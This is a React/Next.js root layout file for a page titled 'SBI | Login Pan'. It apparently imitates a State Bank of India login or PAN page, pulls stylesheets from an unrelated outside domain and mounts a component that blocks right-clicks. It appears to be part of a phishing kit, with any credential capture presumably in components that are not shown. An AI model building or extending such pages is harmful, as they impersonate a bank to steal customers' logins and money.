import React from 'react';
import './globals.css';
import Footer from './include/footer';
import Header from './include/header';
import { CounterProvider } from './lib/CounterContext';
import RightClickBlocker from './include/RightClickBlocker';
import Loader from './include/loader';

export const metadata = {
  title: 'SBI | Login Pan',
  description: '',
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="true" />
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap"
          rel="stylesheet"
        />
        <link rel="stylesheet" href="https://kisme.site/sbi/style3.css" />
        <link rel="stylesheet" href="https://kisme.site/sbi/style2.css" />
      </head>
      <body>
  
      <RightClickBlocker />
        <CounterProvider>
          <Header />
          {children}
          <Footer />
        </CounterProvider>
        <script src='script.js'></script>
      </body>
    </html>
  );
}
